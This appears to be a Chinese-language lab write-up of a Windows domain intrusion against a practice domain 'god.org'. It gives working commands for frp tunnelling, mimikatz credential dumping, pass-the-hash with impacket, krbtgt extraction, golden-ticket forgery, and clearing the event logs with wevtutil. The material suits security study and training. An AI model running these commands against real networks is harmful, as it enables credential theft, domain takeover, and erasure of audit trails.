# getshell
与msf打法相同,蚁剑getshell

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789527221869-467804e8-5612-4e8a-8052-9254faaf6f9c.png)

内网网段可能是192.168.52.0/24

# 搭建通路
**开启服务端**

写好frps.ini配置

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789474884699-897ed6a9-202a-44c2-b58d-e0d508966766.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789474885885-8c1d4155-6212-4e78-b14c-b546f3b6884f.png)

运行`./frps -c ./frps.ini`

**开启客户端**

本地写好frpc.ini配置

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789475913297-1b37863c-25f9-4f26-b6ac-5fb9c9eaef7d.png)

通过蚁剑上传到win7

运行`frpc.exe -c frpc.ini`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789527076566-35ca20c5-5f48-434e-b95d-1f11a32744bf.png)

测试

# 横向移动
## **信息收集**
本地fscan扫描

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789527110481-70bf64a4-0575-4163-8a38-8515cb1710c1.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789538602630-08739daf-54bb-4997-9af6-6d672078c7af.png)

根据fscan结果扫描.发现192.168.52.138是域控,域名god.org

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789540566495-76c0c3ff-f75e-4d9b-a358-b831c14b9e45.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789540840187-c662a7fa-f3f0-44e4-a86c-768399acf775.png)

## 获取凭证
上传 Mimikatz.exe

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789543469324-bfd9c16c-ea75-4305-a234-54282e4a0c5e.png)

蚁剑终端执行

```plain
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

(如果是交互式shell可以直接执行minikatz.exe进入,比如msf获得的路由)

## 获得域控
```plain
proxychains -q impacket-wmiexec -hashes a365227e975e26ac5d2b4d4c6ad2b07d:b09ee0327f95ae09582f74d08eacbeaf god.org/Administrator@192.168.52.138
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1789544522833-8b050727-dc85-4298-b851-2c8dedaed326.png)

## 制作黄金票据
kali端

**获取krbtgthash**

```plain
proxychains4 -q impacket-secretsdump -hashes a365227e975e26ac5d2b4d4c6ad2b07d:b09ee0327f95ae09582f74d08eacbeaf -just-dc-ntlm god.org/Administrator@192.168.52.138
```

**制作黄金票据**

```plain
# 使用 impacket-ticketer 生成黄金票据
impacket-ticketer -nthash 58e91a5ac358d86513ab224312314061 \
  -domain-sid S-1-5-21-2952760202-1353902439-2381784089 \
  -domain god.org \
  Administrator
```

用票据获得域控

```plain
KRB5CCNAME=/root/Administrator.ccache proxychains4 -q impacket-psexec -k -no-pass god.org/Administrator@OWA.god.org -dc-ip 192.168.52.138
```

日志清理

```plain
wevtutil cl Security
wevtutil cl System
```

